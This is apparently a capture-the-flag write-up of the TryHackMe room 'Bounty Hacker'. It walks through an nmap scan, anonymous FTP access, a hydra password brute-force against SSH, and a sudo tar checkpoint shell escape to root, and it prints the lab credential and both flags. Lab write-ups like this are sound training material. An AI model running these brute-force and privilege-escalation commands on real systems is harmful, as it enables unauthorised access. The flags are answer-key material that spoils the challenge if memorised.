---
title: "Bounty Hacker: TryHackMe"
date: 2026-10-19
categories: ["CTF", "TryHackMe"]
tags: ["ctf", "tryhackme", "bounty-hacker", "linux"]
---

# Bounty Hacker: TryHackMe


**Target:** Replace `TARGET_IP` with the address shown in the active room.
Screenshots retain the private address from my original session; it may differ from your current room address.

## 1. Enumerate services
I used **nmap** fast mode to check the target's common ports:
```bash
nmap -F TARGET_IP
```
`-F` scans fewer ports than Nmap's default scan, so this result does not prove that no other ports are open.
![Screenshot](images/Pasted%20image%2020260824160453.png)
The scan found FTP and SSH. I started with FTP and logged in as `anonymous`:
```txt
ftp TARGET_IP
```
I listed the remote files and downloaded `locks.txt` and `task.txt` with **get**:
![Screenshot](images/Pasted%20image%2020260824160943.png)
![Screenshot](images/Pasted%20image%2020260824161518.png)
I read both files locally. `task.txt` identifies `lin` as the author of the task list.
![Screenshot](images/Pasted%20image%2020260824161539.png)
![Screenshot](images/Pasted%20image%2020260824161640.png)

## 2. Guess the SSH password
`locks.txt` is a password list. I used **hydra** to test its entries against SSH:
![Screenshot](images/Pasted%20image%2020260824162302.png)
```txt
hydra -l lin -P locks.txt ssh://TARGET_IP
```
`-l` supplies one username and `-P` supplies a password file. The recovered credential is lab-specific.


**Recovered SSH credential:**
`lin:RedDr4gonSynd1cat3`


## 3. User flag
Log in as `lin` over SSH:
 ```txt
 ssh lin@TARGET_IP
 ```
 ![Screenshot](images/Pasted%20image%2020260824163501.png)
List the home directory and read `user.txt`:
 ![Screenshot](images/Pasted%20image%2020260824163549.png)
 ![Screenshot](images/Pasted%20image%2020260824163708.png)

**User flag:**

```
THM{CR1M3_SyNd1C4T3}
```



## 4. Root flag
Search for `root.txt`:
```txt
find / -name "root.txt" 2>/dev/null
```
`/` searches from the filesystem root. `2>/dev/null` discards permission errors written to standard error.

![Screenshot](images/Pasted%20image%2020260824165353.png)
The first search did not find the file. I checked which commands `lin` could run with elevated privileges:
```txt
sudo -l
```
![Screenshot](images/Pasted%20image%2020260824165952.png)
The sudo rule permits GNU tar to run as root. Its checkpoint action can start a shell:
![Screenshot](images/Pasted%20image%2020260824170439.png)
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
This works only if the active sudo rule permits the command and host policy does not block it.
![Screenshot](images/Pasted%20image%2020260824170713.png)
Check the resulting identity with **id**:
![Screenshot](images/Pasted%20image%2020260824170830.png)
The **id** output confirms root access.
```txt
find / -name "root.txt" 2>/dev/null
```
![Screenshot](images/Pasted%20image%2020260824170944.png)
The search returned `/root/root.txt`; read it to complete the room.
![Screenshot](images/Pasted%20image%2020260824171042.png)

**Root flag:**

```
THM{80UN7Y_h4cK3r}
```


## Findings

I found task.txt and locks.txt on anonymous FTP. The task file named lin, and **hydra** found a password from the supplied list. I used it to log in over SSH and read the user flag. The root step uses a **sudo** permission for **tar** and its checkpoint feature. I kept the passwords and flags next to the steps where I used them.

## What I Learned

I use **nmap**'s fast scan as a quick first look because it checks fewer ports and can miss other services ([Nmap scan options](https://nmap.org/book/port-scanning-options.html)). **hydra**'s `-P` option tells it which password list to try ([Hydra guide](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)). For the last step, I used a feature in GNU **tar** called checkpoints. It only works if **sudo** allows that command ([GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)).
